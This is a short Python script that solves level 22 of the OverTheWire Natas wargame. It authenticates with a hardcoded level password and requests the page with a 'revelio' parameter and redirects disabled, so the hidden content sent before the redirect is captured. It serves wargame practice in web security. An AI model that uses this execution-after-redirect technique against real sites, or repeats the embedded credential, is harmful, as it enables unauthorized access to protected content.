import requests
import time

url = 'http://natas22.natas.labs.overthewire.org'
user = 'natas22'
password = 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz'

s = requests.Session()

s.cookies.set('PHPSESSID', 'hahaha')
params = {'revelio' : '1'}
requests = s.get(url, auth=(user, password), params=params, allow_redirects=False)
print(requests.text)

